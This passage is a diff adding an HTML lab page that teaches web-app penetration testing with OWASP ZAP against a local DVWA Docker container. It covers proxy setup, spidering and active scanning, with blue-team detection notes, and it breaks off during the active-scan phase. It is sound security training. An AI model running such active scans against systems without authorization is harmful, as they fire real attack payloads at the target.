@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OWASP ZAP 2.15+ — Web Application Penetration Testing Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;500;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0d12;
+  --bg2: #0f1420;
+  --bg3: #151c2c;
+  --bg4: #1a2236;
+  --border: #1e2d45;
+  --border2: #243352;
+  --green: #00d97e;
+  --green-dim: #00a05c;
+  --green-bg: rgba(0,217,126,0.08);
+  --green-border: rgba(0,217,126,0.25);
+  --amber: #f5a623;
+  --amber-dim: #c47d10;
+  --amber-bg: rgba(245,166,35,0.08);
+  --amber-border: rgba(245,166,35,0.25);
+  --red: #ff4d6d;
+  --red-dim: #cc2244;
+  --red-bg: rgba(255,77,109,0.08);
+  --red-border: rgba(255,77,109,0.25);
+  --blue: #4d9fff;
+  --blue-dim: #2275d4;
+  --blue-bg: rgba(77,159,255,0.08);
+  --blue-border: rgba(77,159,255,0.25);
+  --purple: #9d7dff;
+  --purple-bg: rgba(157,125,255,0.08);
+  --purple-border: rgba(157,125,255,0.25);
+  --cyan: #00e5ff;
+  --cyan-bg: rgba(0,229,255,0.07);
+  --text: #e2e8f5;
+  --text2: #8899bb;
+  --text3: #4a5a7a;
+  --mono: 'JetBrains Mono', monospace;
+  --display: 'Syne', sans-serif;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--display);
+  font-size: 15px;
+  line-height: 1.65;
+  min-height: 100vh;
+}
+
+/* SCANLINE OVERLAY */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+  pointer-events: none; z-index: 0;
+}
+
+.wrapper { max-width: 960px; margin: 0 auto; padding: 2rem 1.5rem 4rem; position: relative; z-index: 1; }
+
+/* HEADER */
+.lab-header {
+  border: 1px solid var(--green-border);
+  background: linear-gradient(135deg, var(--bg2) 0%, var(--bg3) 100%);
+  border-radius: 12px;
+  padding: 2rem 2.5rem;
+  margin-bottom: 2rem;
+  position: relative;
+  overflow: hidden;
+}
+.lab-header::before {
+  content: '';
+  position: absolute; top: 0; left: 0; right: 0; height: 2px;
+  background: linear-gradient(90deg, transparent, var(--green), var(--cyan), transparent);
+}
+.lab-header::after {
+  content: 'ZAP';
+  position: absolute; right: 2rem; top: 50%; transform: translateY(-50%);
+  font-family: var(--mono); font-size: 80px; font-weight: 700;
+  color: rgba(0,217,126,0.04); letter-spacing: -4px; pointer-events: none;
+}
+.header-top { display: flex; align-items: flex-start; justify-content: space-between; flex-wrap: wrap; gap: 12px; }
+.lab-eyebrow { font-family: var(--mono); font-size: 11px; color: var(--green); letter-spacing: 3px; text-transform: uppercase; margin-bottom: 8px; }
+.lab-title { font-size: 26px; font-weight: 800; color: var(--text); letter-spacing: -0.5px; line-height: 1.2; }
+.lab-title span { color: var(--green); }
+.lab-sub { font-size: 13px; color: var(--text2); margin-top: 6px; }
+.badges { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 14px; }
+.badge {
+  font-family: var(--mono); font-size: 11px; padding: 4px 10px;
+  border-radius: 4px; border: 1px solid; font-weight: 500; letter-spacing: 0.5px;
+}
+.b-green { background: var(--green-bg); color: var(--green); border-color: var(--green-border); }
+.b-amber { background: var(--amber-bg); color: var(--amber); border-color: var(--amber-border); }
+.b-blue  { background: var(--blue-bg);  color: var(--blue);  border-color: var(--blue-border); }
+.b-red   { background: var(--red-bg);   color: var(--red);   border-color: var(--red-border); }
+.b-purple{ background: var(--purple-bg);color: var(--purple);border-color: var(--purple-border); }
+.b-cyan  { background: var(--cyan-bg);  color: var(--cyan);  border-color: rgba(0,229,255,0.25); }
+
+/* PROGRESS */
+.progress-wrap {
+  background: var(--bg2); border: 1px solid var(--border2);
+  border-radius: 10px; padding: 1.25rem 1.5rem; margin-bottom: 1.5rem;
+}
+.prog-top { display: flex; justify-content: space-between; font-family: var(--mono); font-size: 12px; color: var(--text2); margin-bottom: 10px; }
+.prog-track { height: 4px; background: var(--border); border-radius: 99px; overflow: hidden; }
+.prog-fill { height: 100%; background: linear-gradient(90deg, var(--green), var(--cyan)); border-radius: 99px; transition: width 0.6s cubic-bezier(.4,0,.2,1); width: 0%; }
+.phase-dots { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; }
+.pdot {
+  width: 32px; height: 32px; border-radius: 50%;
+  font-family: var(--mono); font-size: 11px; font-weight: 700;
+  display: flex; align-items: center; justify-content: center;
+  border: 1px solid var(--border2); cursor: pointer; transition: all 0.2s;
+  color: var(--text3); background: var(--bg3);
+}
+.pdot:hover { border-color: var(--green); color: var(--green); }
+.pdot.done { background: var(--green-bg); color: var(--green); border-color: var(--green-border); }
+.pdot.active { background: var(--blue-bg); color: var(--blue); border-color: var(--blue-border); }
+
+/* PHASE NAV */
+.phase-nav { display: flex; gap: 6px; margin-bottom: 1.5rem; flex-wrap: wrap; }
+.pnav-btn {
+  font-family: var(--mono); font-size: 12px; padding: 7px 14px;
+  border-radius: 6px; border: 1px solid var(--border2);
+  background: var(--bg2); color: var(--text3); cursor: pointer; transition: all 0.15s;
+  letter-spacing: 0.3px;
+}
+.pnav-btn:hover { background: var(--bg3); color: var(--text2); border-color: var(--border); }
+.pnav-btn.active { background: var(--blue-bg); color: var(--blue); border-color: var(--blue-border); }
+.pnav-btn.done { background: var(--green-bg); color: var(--green); border-color: var(--green-border); }
+
+/* PANELS */
+.phase-panel { display: none; }
+.phase-panel.visible { display: block; }
+
+/* PHASE HEADER */
+.phase-hdr {
+  display: flex; align-items: flex-start; gap: 16px; margin-bottom: 1.5rem;
+  padding-bottom: 1.25rem; border-bottom: 1px solid var(--border);
+}
+.phase-icon {
+  width: 50px; height: 50px; border-radius: 10px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 24px; flex-shrink: 0; border: 1px solid var(--border2);
+}
+.phase-hdr-text h2 { font-size: 20px; font-weight: 700; letter-spacing: -0.3px; }
+.phase-hdr-text p { font-size: 13px; color: var(--text2); margin-top: 3px; font-family: var(--mono); }
+
+/* CARDS */
+.card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 10px; padding: 1.25rem 1.5rem; margin-bottom: 1rem;
+}
+.card-title {
+  font-size: 14px; font-weight: 700; margin-bottom: 12px;
+  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+}
+.time-tag { font-family: var(--mono); font-size: 11px; padding: 2px 8px; border-radius: 4px; background: var(--amber-bg); color: var(--amber); border: 1px solid var(--amber-border); }
+.mitre-tag { font-family: var(--mono); font-size: 11px; padding: 2px 8px; border-radius: 4px; background: var(--purple-bg); color: var(--purple); border: 1px solid var(--purple-border); }
+.owasp-tag { font-family: var(--mono); font-size: 11px; padding: 2px 8px; border-radius: 4px; background: var(--red-bg); color: var(--red); border: 1px solid var(--red-border); }
+
+/* STEP LIST */
+.step-list { list-style: none; counter-reset: steps; }
+.step-list li {
+  counter-increment: steps;
+  padding: 9px 0 9px 38px; position: relative;
+  border-bottom: 1px solid var(--border); font-size: 14px;
+  color: var(--text); cursor: pointer; transition: color 0.15s;
+}
+.step-list li:last-child { border-bottom: none; }
+.step-list li::before {
+  content: counter(steps);
+  position: absolute; left: 0; top: 10px;
+  width: 24px; height: 24px; border-radius: 50%;
+  background: var(--blue-bg); color: var(--blue);
+  border: 1px solid var(--blue-border);
+  font-family: var(--mono); font-size: 11px; font-weight: 700;
+  display: flex; align-items: center; justify-content: center;
+}
+.step-list li.done { color: var(--text3); text-decoration: line-through; }
+.step-list li.done::before { content: '✓'; background: var(--green-bg); color: var(--green); border-color: var(--green-border); }
+.step-list li:hover { color: var(--blue); }
+code {
+  font-family: var(--mono); font-size: 12px;
+  background: var(--bg4); color: var(--cyan);
+  padding: 1px 6px; border-radius: 4px; border: 1px solid var(--border2);
+}
+
+/* TERMINAL */
+.terminal {
+  background: #060910; border: 1px solid var(--border2);
+  border-radius: 8px; padding: 1rem 1.25rem; margin: 10px 0;
+  font-family: var(--mono); font-size: 13px; position: relative; overflow-x: auto;
+}
+.terminal::before {
+  content: '● ● ●';
+  display: block; color: var(--border2); font-size: 10px;
+  letter-spacing: 4px; margin-bottom: 10px;
+}
+.t-prompt { color: var(--green); }
+.t-cmd { color: #e2e8f5; }
+.t-comment { color: #3a4f70; }
+.t-out { color: #5a7090; display: block; margin-top: 3px; }
+.t-hi { color: var(--amber); }
+.t-vuln { color: var(--red); }
+.t-good { color: var(--green); }
+.t-cyan { color: var(--cyan); }
+.copy-btn {
+  position: absolute; top: 10px; right: 10px;
+  font-family: var(--mono); font-size: 11px; padding: 3px 10px;
+  background: var(--bg3); color: var(--text3); border: 1px solid var(--border2);
+  border-radius: 4px; cursor: pointer; transition: all 0.15s;
+}
+.copy-btn:hover { background: var(--bg4); color: var(--text2); }
+
+/* CALLOUTS */
+.tip { background: var(--blue-bg); border-left: 3px solid var(--blue); border-radius: 0 6px 6px 0; padding: 10px 14px; margin: 10px 0; font-size: 13px; color: #8ab8ff; }
+.warn { background: var(--amber-bg); border-left: 3px solid var(--amber); border-radius: 0 6px 6px 0; padding: 10px 14px; margin: 10px 0; font-size: 13px; color: var(--amber); }
+.danger { background: var(--red-bg); border-left: 3px solid var(--red); border-radius: 0 6px 6px 0; padding: 10px 14px; margin: 10px 0; font-size: 13px; color: var(--red); }
+.success { background: var(--green-bg); border-left: 3px solid var(--green); border-radius: 0 6px 6px 0; padding: 10px 14px; margin: 10px 0; font-size: 13px; color: var(--green); }
+
+/* BLUE OVERLAY */
+.blue-overlay {
+  background: var(--purple-bg); border: 1px solid var(--purple-border);
+  border-radius: 8px; padding: 1rem 1.25rem; margin-top: 12px;
+}
+.blue-overlay-title { font-family: var(--mono); font-size: 12px; color: var(--purple); font-weight: 700; margin-bottom: 8px; letter-spacing: 1px; }
+.blue-overlay ul { padding-left: 16px; }
+.blue-overlay li { font-size: 13px; color: #b8a0ff; margin: 4px 0; }
+
+/* FINDING CARD */
+.finding {
+  background: var(--bg3); border: 1px solid var(--red-border);
+  border-radius: 8px; padding: 1rem 1.25rem; margin: 12px 0;
+}
+.finding-label { font-family: var(--mono); font-size: 11px; color: var(--red); font-weight: 700; margin-bottom: 8px; letter-spacing: 1px; }
+.finding-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; padding: 5px 0; border-bottom: 1px solid var(--border); }
+.finding-row:last-child { border-bottom: none; }
+.finding-row .fk { color: var(--text3); font-family: var(--mono); font-size: 12px; }
+.finding-row .fv { color: var(--text); font-weight: 500; text-align: right; }
+
+/* COMPLETE BTN */
+.complete-btn {
+  display: inline-flex; align-items: center; gap: 8px;
+  font-family: var(--mono); font-size: 12px; padding: 10px 20px;
+  border-radius: 6px; border: 1px solid var(--green-border);
+  background: var(--green-bg); color: var(--green);
+  cursor: pointer; transition: all 0.2s; margin-top: 14px; font-weight: 700;
+}
+.complete-btn:hover { background: rgba(0,217,126,0.15); }
+.complete-btn.done { background: var(--green); color: #000; border-color: var(--green); }
+
+/* NAV ROW */
+.nav-row { display: flex; justify-content: space-between; align-items: center; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid var(--border); }
+.nav-btn {
+  font-family: var(--mono); font-size: 12px; padding: 9px 18px;
+  border-radius: 6px; border: 1px solid var(--border2);
+  background: var(--bg3); color: var(--text2); cursor: pointer; transition: all 0.15s; font-weight: 500;
+}
+.nav-btn:hover { background: var(--bg4); border-color: var(--border); }
+.nav-btn.primary { background: var(--blue-bg); color: var(--blue); border-color: var(--blue-border); }
+.nav-btn.primary:hover { background: rgba(77,159,255,0.15); }
+
+/* ZAP VERSION BANNER */
+.version-banner {
+  background: var(--bg3); border: 1px solid var(--cyan-bg);
+  border-radius: 8px; padding: 10px 16px; margin-bottom: 12px;
+  display: flex; align-items: center; gap: 10px; font-family: var(--mono); font-size: 12px;
+}
+.version-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green); flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+
+/* METRIC GRID */
+.metric-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 10px; margin: 12px 0; }
+.metric { border-radius: 8px; padding: 12px; text-align: center; border: 1px solid; }
+.metric .num { font-family: var(--mono); font-size: 26px; font-weight: 700; }
+.metric .lbl { font-family: var(--mono); font-size: 11px; margin-top: 2px; }
+.m-red { background: var(--red-bg); border-color: var(--red-border); color: var(--red); }
+.m-amber { background: var(--amber-bg); border-color: var(--amber-border); color: var(--amber); }
+.m-blue { background: var(--blue-bg); border-color: var(--blue-border); color: var(--blue); }
+.m-green { background: var(--green-bg); border-color: var(--green-border); color: var(--green); }
+
+/* ROAD MAP TABLE */
+.roadmap-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+.roadmap-table td { padding: 8px 12px; border-bottom: 1px solid var(--border); }
+.roadmap-table td:first-child { font-family: var(--mono); color: var(--text3); width: 120px; }
+.roadmap-table td:last-child { text-align: right; }
+
+/* ZAP UI PATH */
+.zap-path {
+  display: inline-flex; align-items: center; gap: 4px;
+  font-family: var(--mono); font-size: 12px; color: var(--cyan);
+  background: var(--cyan-bg); padding: 3px 8px; border-radius: 4px;
+  border: 1px solid rgba(0,229,255,0.15);
+}
+.zap-path .sep { color: var(--text3); }
+
+/* RESPONSIVE */
+@media (max-width: 600px) {
+  .wrapper { padding: 1rem; }
+  .lab-header { padding: 1.25rem; }
+  .lab-header::after { display: none; }
+  .lab-title { font-size: 20px; }
+}
+</style>
+</head>
+<body>
+<div class="wrapper">
+
+<!-- HEADER -->
+<div class="lab-header">
+  <div class="header-top">
+    <div>
+      <div class="lab-eyebrow">Red Team Lab // PTES-Aligned // Authorized Testing Only</div>
+      <div class="lab-title">OWASP <span>ZAP 2.15+</span> Web App Pentest Lab</div>
+      <div class="lab-sub">Full-cycle web application penetration testing using OWASP ZAP against DVWA on Docker</div>
+      <div class="badges">
+        <span class="badge b-green">Beginner Friendly</span>
+        <span class="badge b-amber">~2 Hours</span>
+        <span class="badge b-blue">ZAP 2.15+</span>
+        <span class="badge b-purple">MITRE ATT&CK</span>
+        <span class="badge b-red">Authorized Lab Only</span>
+        <span class="badge b-cyan">DVWA on Docker</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PROGRESS -->
+<div class="progress-wrap">
+  <div class="prog-top">
+    <span>Lab Progress</span>
+    <span id="prog-text">0 of 6 phases complete</span>
+  </div>
+  <div class="prog-track"><div class="prog-fill" id="prog-fill"></div></div>
+  <div class="phase-dots">
+    <div class="pdot active" data-p="0" onclick="goPhase(0)" title="Setup">S</div>
+    <div class="pdot" data-p="1" onclick="goPhase(1)" title="Phase 1">1</div>
+    <div class="pdot" data-p="2" onclick="goPhase(2)" title="Phase 2">2</div>
+    <div class="pdot" data-p="3" onclick="goPhase(3)" title="Phase 3">3</div>
+    <div class="pdot" data-p="4" onclick="goPhase(4)" title="Phase 4">4</div>
+    <div class="pdot" data-p="5" onclick="goPhase(5)" title="Phase 5">5</div>
+    <div class="pdot" data-p="6" onclick="goPhase(6)" title="Report">R</div>
+  </div>
+</div>
+
+<!-- PHASE NAV -->
+<div class="phase-nav">
+  <button class="pnav-btn active" onclick="goPhase(0)">Setup</button>
+  <button class="pnav-btn" onclick="goPhase(1)">1 — Recon</button>
+  <button class="pnav-btn" onclick="goPhase(2)">2 — Active Scan</button>
+  <button class="pnav-btn" onclick="goPhase(3)">3 — SQLi</button>
+  <button class="pnav-btn" onclick="goPhase(4)">4 — XSS</button>
+  <button class="pnav-btn" onclick="goPhase(5)">5 — RCE</button>
+  <button class="pnav-btn" onclick="goPhase(6)">Report</button>
+</div>
+
+<!-- PHASE 0: SETUP -->
+<div class="phase-panel visible" id="panel-0">
+  <div class="phase-hdr">
+    <div class="phase-icon" style="background:var(--green-bg);">⚙️</div>
+    <div class="phase-hdr-text">
+      <h2>Lab Setup &amp; Environment</h2>
+      <p>Pre-Engagement // Est. 15–20 min // ZAP 2.15+ + DVWA on Docker</p>
+    </div>
+  </div>
+  <div class="version-banner">
+    <div class="version-dot"></div>
+    <span style="color:var(--text2);">This lab targets</span>&nbsp;
+    <span style="color:var(--cyan);">OWASP ZAP 2.15.0+</span>&nbsp;
+    <span style="color:var(--text2);">— UI paths reflect the current ZAP interface</span>
+  </div>
+  <div class="danger"><strong>Authorization required.</strong> All testing is performed against DVWA — a legal, intentionally vulnerable app running locally in Docker. Never use these techniques against systems you do not own or have documented written authorization for.</div>
+  <div class="card">
+    <div class="card-title">Pre-requisites checklist</div>
+    <ul class="step-list">
+      <li onclick="chk(this)">OS: Kali Linux 2024.x / Parrot OS / Ubuntu 22+ (8 GB RAM minimum)</li>
+      <li onclick="chk(this)">OWASP ZAP 2.15+ — <code>sudo apt install zaproxy</code> on Kali, or download from <code>zaproxy.org</code></li>
+      <li onclick="chk(this)">Docker Engine installed and running — <code>sudo systemctl start docker</code></li>
+      <li onclick="chk(this)">Firefox with FoxyProxy Standard extension installed</li>
+      <li onclick="chk(this)">Port 80 free — stop any local web server: <code>sudo systemctl stop apache2</code></li>
+    </ul>
+  </div>
+  <div class="card">
+    <div class="card-title">Step 1 — Spin up DVWA in Docker</div>
+    <div class="terminal">
+      <button class="copy-btn" onclick="cp(this)">copy</button>
+      <span class="t-comment"># Pull the DVWA image</span><br>
+      <span class="t-prompt">$ </span><span class="t-cmd">sudo docker pull vulnerables/web-dvwa</span><br>
+      <span class="t-out">Status: Downloaded newer image for vulnerables/web-dvwa:latest</span><br><br>
+      <span class="t-comment"># Run DVWA — maps container port 80 to host port 80</span><br>
+      <span class="t-prompt">$ </span><span class="t-cmd">sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa</span><br>
+      <span class="t-out">Starting MySQL ... ok</span><br>
+      <span class="t-out">Starting Apache httpd ... ok</span><br>
+      <span class="t-good">DVWA running. Browse to http://127.0.0.1</span>
+    </div>
+    <div class="tip">Your container gets an auto-generated name (e.g. <code>elastic_galois</code>). Use it with <code>docker stop</code>, <code>docker start</code>, <code>docker logs -f</code>. Remove dead containers with <code>docker rm &lt;name&gt;</code>.</div>
+  </div>
+  <div class="card">
+    <div class="card-title">Step 2 — DVWA first-time database setup</div>
+    <ul class="step-list">
+      <li onclick="chk(this)">Browse to <code>http://127.0.0.1/setup.php</code></li>
+      <li onclick="chk(this)">Click <strong>"Create / Reset Database"</strong> — wait for green Success messages</li>
+      <li onclick="chk(this)">Login at <code>http://127.0.0.1/login.php</code> with <code>admin</code> / <code>password</code></li>
+      <li onclick="chk(this)">Click <strong>DVWA Security</strong> in the left menu → set to <strong>Low</strong> → click <strong>Submit</strong></li>
+    </ul>
+    <div class="success">Dashboard loads with security level showing "Low" — setup complete.</div>
+  </div>
+  <div class="card">
+    <div class="card-title">Step 3 — Configure ZAP 2.15+ proxy &amp; Firefox</div>
+    <div class="warn">ZAP 2.15+ reorganised the options menu. Use these exact paths.</div>
+    <ul class="step-list">
+      <li onclick="chk(this)">Launch ZAP. When prompted about session persistence — choose <strong>"No, I do not want to persist this session"</strong> for now.</li>
+      <li onclick="chk(this)">Confirm proxy: <span class="zap-path">Tools → Options → Network → Local Servers/Proxies</span> — should show <code>127.0.0.1:8080</code></li>
+      <li onclick="chk(this)">Export CA cert: <span class="zap-path">Tools → Options → Network → Server Certificates</span> → click <strong>Save</strong> → save as <code>zap-root-ca.cer</code></li>
+      <li onclick="chk(this)">Import cert in Firefox: <code>about:preferences#privacy</code> → Certificates → View Certificates → Authorities → Import → select <code>zap-root-ca.cer</code> → tick <strong>"Trust this CA to identify websites"</strong></li>
+      <li onclick="chk(this)">In FoxyProxy: add proxy <code>127.0.0.1</code> port <code>8080</code> — enable it</li>
+      <li onclick="chk(this)"><strong>Localhost proxy fix:</strong> Firefox <code>about:config</code> → search <code>network.proxy.allow_hijacking_localhost</code> → set to <code>true</code></li>
+      <li onclick="chk(this)">FoxyProxy: edit your ZAP entry → URL Patterns tab → add <code>http://127.0.0.1/*</code> as Whitelist pattern</li>
+    </ul>
+    <div class="success">Validation: browse to <code>http://127.0.0.1/dvwa</code> with FoxyProxy active — ZAP History tab should instantly show the GET request and the Sites tree should populate.</div>
+  </div>
+  <button class="complete-btn" id="cb-0" onclick="markDone(0)">Mark setup complete →</button>
+  <div class="nav-row">
+    <span></span>
+    <button class="nav-btn primary" onclick="goPhase(1)">Start Phase 1: Recon →</button>
+  </div>
+</div>
+
+<!-- PHASE 1: RECON -->
+<div class="phase-panel" id="panel-1">
+  <div class="phase-hdr">
+    <div class="phase-icon" style="background:var(--blue-bg);">🔍</div>
+    <div class="phase-hdr-text">
+      <h2>Phase 1 — Reconnaissance &amp; Spidering</h2>
+      <p>PTES Phase 2 // Est. 20 min // T1595 — Active Scanning</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Concept: Why seed before spidering? <span class="time-tag">5 min</span></div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:10px;">ZAP's spider follows links it discovers. If you give it a logged-in starting point it maps authenticated pages. If you let it start cold it gets stuck on the login redirect and discovers almost nothing. Manual seeding = handing ZAP a map before asking it to search the building.</p>
+    <ul class="step-list">
+      <li onclick="chk(this)">Enable FoxyProxy → browse to <code>http://127.0.0.1/dvwa</code> — confirm ZAP History tab shows the request</li>
+      <li onclick="chk(this)">Log in with <code>admin</code> / <code>password</code></li>
+      <li onclick="chk(this)">Click every left-menu item one by one: SQL Injection, XSS Reflected, XSS Stored, Command Injection, File Upload, Brute Force, CSRF, File Inclusion</li>
+      <li onclick="chk(this)">On each page: submit at least one default input (hit Submit/Run without changing anything)</li>
+      <li onclick="chk(this)">Watch ZAP Sites tree: <code>http://127.0.0.1</code> should expand showing <code>/dvwa/vulnerabilities/</code> with all sub-paths</li>
+    </ul>
+    <div class="success">Sites tree should show 8+ vulnerability paths. That's your seed. Now the spider has real links to follow.</div>
+  </div>
+  <div class="card">
+    <div class="card-title">Run the Standard Spider <span class="time-tag">8 min</span><span class="mitre-tag">T1595.003</span></div>
+    <ul class="step-list">
+      <li onclick="chk(this)">In ZAP Sites tree: right-click <code>http://127.0.0.1</code> → <strong>Attack → Spider</strong></li>
+      <li onclick="chk(this)">Start URL: <code>http://127.0.0.1/dvwa/</code> — tick <strong>Recurse</strong></li>
+      <li onclick="chk(this)">Click <strong>Start Scan</strong> — watch the Spider tab at the bottom populate with URLs</li>
+      <li onclick="chk(this)">When complete: note total URL count shown in the Spider tab footer</li>
+    </ul>
+    <div class="terminal">
+      <span class="t-comment"># Expected ZAP Spider tab output</span><br>
+      <span class="t-hi">Processed: 34 URLs | Out of scope: 0 | I/O errors: 0</span><br>
+      <span class="t-out">http://127.0.0.1/dvwa/vulnerabilities/sqli/</span><br>
+      <span class="t-out">http://127.0.0.1/dvwa/vulnerabilities/xss_r/</span><br>
+      <span class="t-out">http://127.0.0.1/dvwa/vulnerabilities/xss_s/</span><br>
+      <span class="t-out">http://127.0.0.1/dvwa/vulnerabilities/exec/</span><br>
+      <span class="t-out">http://127.0.0.1/dvwa/vulnerabilities/upload/</span><br>
+      <span class="t-out">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=include.php</span>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">AJAX Spider — for JS-heavy apps <span class="time-tag">5 min</span></div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:10px;">DVWA is mostly server-rendered so the standard spider is sufficient. Learn AJAX Spider now because every real-world React/Vue/Angular app needs it.</p>
+    <ul class="step-list">
+      <li onclick="chk(this)">In ZAP menu bar: <span class="zap-path">Tools → AJAX Spider</span></li>
+      <li onclick="chk(this)">Start URL: <code>http://127.0.0.1/dvwa/</code> — Browser: <strong>Firefox Headless</strong></li>
+      <li onclick="chk(this)">Click <strong>Start Scan</strong> — ZAP drives a real headless browser, executing JS and discovering dynamically-rendered links</li>
+      <li onclick="chk(this)">Compare AJAX Spider results with standard Spider — note any additional URLs discovered</li>
+    </ul>
+    <div class="tip">On real engagements: always run both spiders. Standard spider is fast and handles forms well. AJAX spider finds content behind JS-rendered navigation, SPAs, and lazy-loaded components.</div>
+  </div>
+  <div class="blue-overlay">
+    <div class="blue-overlay-title">🔵 Blue Team Overlay — Detection</div>
+    <ul>
+      <li>Web logs: rapid sequential GET requests from single IP hitting every path — classic spider pattern</li>
+      <li>User-Agent: ZAP default UA contains "ZAP" — trivial WAF/proxy detection rule</li>
+      <li>SIEM rule: >50 unique URLs crawled from one IP in 60 seconds → alert</li>
+      <li>Mitigation: robots.txt rate limiting, honeypot URLs (canary links), WAF bot detection</li>
+      <li>NIST SP 800-53: SI-4 (System Monitoring), SC-5 (Denial of Service Protection)</li>
+    </ul>
+  </div>
+  <button class="complete-btn" id="cb-1" onclick="markDone(1)">Mark Phase 1 complete →</button>
+  <div class="nav-row">
+    <button class="nav-btn" onclick="goPhase(0)">← Setup</button>
+    <button class="nav-btn primary" onclick="goPhase(2)">Phase 2: Active Scan →</button>
+  </div>
+</div>
+
+<!-- PHASE 2: ACTIVE SCAN -->
+<div class="phase-panel" id="panel-2">
+  <div class="phase-hdr">
+    <div class="phase-icon" style="background:var(--amber-bg);">⚡</div>
+    <div class="phase-hdr-text">
+      <h2>Phase 2 — Active Scanning &amp; Vulnerability Discovery</h2>
+      <p>PTES Phase 4 // Est. 25 min // T1190 — Exploit Public-Facing Application</p>
+    </div>
+  </div>
+  <div class="warn"><strong>Active scanning fires real attack payloads at the target.</strong> This is why DVWA in Docker is the only acceptable target for this lab. On real engagements: always confirm active scanning is in scope and agreed in the RoE before proceeding.</div>
+  <div class="card">
+    <div class="card-title">Create a Custom Scan Policy <span class="time-tag">5 min</span></div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:10px;">Default ZAP scan policy runs every check. For targeted web app testing, create a focused policy — faster scans, fewer false positives, more relevant results.</p>
+    <ul class="step-list">
+      <li onclick="chk(this)"><span class="zap-path">Analyse → Scan Policy Manager</span> → click <strong>Add</strong></li>
+      <li onclick="chk(this)">Name it <code>DVWA-WebApp-Lab</code></li>
+      <li onclick="chk(this)">Enable categories: <strong>Injection</strong>, <strong>XSS</strong>, <strong>Path Traversal</strong>, <strong>Remote File Inclusion</strong>, <strong>Server Side Include</strong></li>
+      <li onclick="chk(this)">Set threshold to <strong>Medium</strong> and strength to <strong>High</strong> for Injection checks</li>
+      <li onclick="chk(this)">Disable: Buffer Overflow, Format String (not applicable to PHP web apps)</li>
+      <li onclick="chk(this)">Click <strong>OK</strong> to save the policy</li>
+    </ul>
+    <div class="tip">Saving custom scan policies = professional practice. On real engagements you build one per tech stack (PHP, Java, Node.js) and reuse across engagements.</div>
+  </div>
+  <div class="card">
+    <div class="card-title">Run Active Scan Against DVWA <span class="time-tag">15 min</span><span class="mitre-tag">T1190</span><span class="owasp-tag">OWASP A03/A05</span></div>
+    <ul class="step-list">
+      <li onclick="chk(this)">In ZAP Sites tree: right-click <code>http://127.0.0.1/dvwa</code> → <strong>Attack → Active Scan</strong></li>
+      <li onclick="chk(this)">In the Active Scan dialog: select your <code>DVWA-WebApp-Lab</code> policy from the Policy dropdown</li>
+      <li onclick="chk(this)">Tick <strong>Recurse</strong> — this scans all discovered child URLs, not just the entry point</li>
+      <li onclick="chk(this)">Click <strong>Start Scan</strong> — estimated runtime: 10–15 minutes</li>
+      <li onclick="chk(this)">Watch the Active Scan tab progress bar and the Alerts tab building up in real time</li>
+    </ul>
+    <div class="terminal">
+      <span class="t-comment"># Expected Alerts tab summary after scan completes</span><br>
+      <span class="t-vuln">&#9632; High:   SQL Injection (3 instances) — /dvwa/vulnerabilities/sqli/</span><br>
+      <span class="t-vuln">&#9632; High:   Cross Site Scripting - Reflected (5 instances)</span><br>
+      <span class="t-vuln">&#9632; High:   Remote OS Command Injection</span><br>
+      <span class="t-hi">&#9632; Medium: X-Frame-Options Header Not Set</span><br>
+      <span class="t-hi">&#9632; Medium: Content Security Policy (CSP) Header Not Present</span><br>
+      <span class="t-hi">&#9632; Medium: Missing Anti-CSRF Tokens</span><br>
+      <span class="t-out">&#9632; Low:    Cookie Without Secure Flag</span><br>
+      <span class="t-out">&#9632; Low:    Cookie Without HttpOnly Flag</span><br>
+      <span class="t-out">&#9632; Info:   User Controllable HTML Element Attribute (Potential XSS)</span>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Read an Alert Properly <span class="time-tag">5 min</span></div>
+    <p style="font-size:14px;color:var(--text2);margin-bottom:10px;">Every ZAP alert contains the evidence you need to write a finding. Learn to read it properly now.</p>
+    <ul class="step-list">
+      <li onclick="chk(this)">Click any <strong>High</strong> alert in the Alerts tab</li>
+      <li onclick="chk(this)">Read the <strong>Alert</strong> pane at the bottom — note: URL, Parameter, Attack, Evidence, Description, Solution</li>
+      <li onclick="chk(this)">Click the <strong>Request</strong> tab in the bottom pane — see the exact HTTP request ZAP sent including the payload</li>
+      <li onclick="chk(this)">Click the <strong>Response</strong> tab — see the server response that triggered the alert</li>
+      <li onclick="chk(this)">Right-click the alert → <strong>Open in Browser</strong> — ZAP replays the attack in your browser</li>
+    </ul>
+    <div class="tip">The Request + Response tabs ARE your evidence. Screenshot them for every High/Critical finding before writing your report.</div>
+  </div>
+  <div class="blue-overlay">
+    <div class="blue-overlay-title">🔵 Blue Team Overlay — Detection</div>
+    <ul>
+      <li>Active scan produces thousands of 4xx/5xx errors — extremely visible in web access logs</li>
